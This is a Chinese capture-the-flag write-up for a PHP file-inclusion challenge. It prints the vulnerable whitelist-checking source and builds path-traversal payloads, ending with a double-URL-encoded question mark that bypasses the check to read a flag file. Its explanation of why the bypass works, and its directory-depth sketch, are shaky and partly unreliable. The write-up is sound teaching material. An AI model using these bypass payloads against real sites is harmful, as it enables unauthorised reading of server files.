---
tags:
  - "#代码审计"
  - "#绕过"
  - "#url解编码"
date: 2026-09-23 21:00
author: 冰冰洁
---

# 题目审计

查看网页源代码得到提示`source.php`

访问对应界面得到以下源码：

```php
<?php  
    highlight_file(__FILE__);  
    class emmm    {  
        public static function checkFile(&$page)  
        {   
                 $whitelist = ["source"=>"source.php","hint"=>"hint.php"];  
            if (! isset($page) || !is_string($page)) {  
                echo "you can't see it";  
                return false;  
            }  
  
            if (in_array($page, $whitelist)) {  
                return true;  
            }          
              $_page = mb_substr($page,0,mb_strpos($page . '?', '?')  
            );  
            if (in_array($_page, $whitelist)) {  
                return true;  
            }            
            $_page = urldecode($page);
            $_page = mb_substr($_page, 0, mb_strpos($_page . '?', '?')  
            );  
            if (in_array($_page, $whitelist)) {  
                return true;  
            }  
            echo "you can't see it";  
            return false;  
        }  
    }  
  
    if (! empty($_REQUEST['file'])  
        && is_string($_REQUEST['file'])  
        && emmm::checkFile($_REQUEST['file'])  
    ) {  
        include $_REQUEST['file'];  
        exit;  
    } else {  
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";  
    }  ?>
```

该代码中有一个对输入的文件进行检查的函数`checkFile`：

1. page的值为空或者不是字符串：直接return false
2. 如果不做处理情况下在白名单中则直接通过检查
3. 前两个都没通过则截取问号前的内容去查看是否在白名单中，若在的话则通过检查
4. 前三个条件都没通过则先对page进行解码，然后再截取问号前的内容，如果问号前的内容在白名单内，通过
5. 前四个条件都没通过，则无法查看文件内容

根据这个源码猜测我们要看到某个文件，然后又注意到白名单中有一个`hint.php`文件。访问：

![[Pasted image 20260923212226.png]]

可以得到flag在文件`ffffllllaaaagggg`中

## payload构造

因此我们需要使输入的payload通过检查后的样子大概如下：

```
 ?file=../../../../../ffffllllaaaagggg
```

如果我们直接输入以上的payload。则会导致没有字符没在白名单内。被pass

如果我们输入：

```
source.php?../../../../../ffffllllaaaagggg
```

那就会导致include以为这是文件全名，无法找到这个文件

如果我们输入：

```
source.php%3f../.././../../ffffllllaaaagggg
```

则会导致在第二次检查时通过，但是include还是无法找到`ffffllllaaaagggg`这个文件

如果我们输入：

```
source.php%253f../../../../../ffffllllaaaagggg
```

那么在第三次检查才会通过，且此时include收到的是：

```
source.php%3f../../../../../ffffllllaaaagggg
```

通过web服务器处理后会找到ffffllllaaaagggg文件

注意：**这里两个不同的地方时是对问号的处理，include不能直接用问号这样会找不到这个文件，但是双重编码后的payload到include这个函数时的形态不包含问号。因此我的理解是此时这个函数名会被拿到web服务器去寻找。web服务器处理时对问号的理解不一样。因此能够得到最终的flag**

## 为什么是5层

```
 当前目录结构（假设）：
 /var/www/html/（网站根目录）
   └── subdir/（source.php所在目录）
        └── 当前请求位置
 
 目标文件：
 /ffffllllaaaagggg（根目录）
 
 需要回退：
 subdir/ → ../../../../
 具体：subdir/需要 ../ 到根目录
 一般4-5个足够
```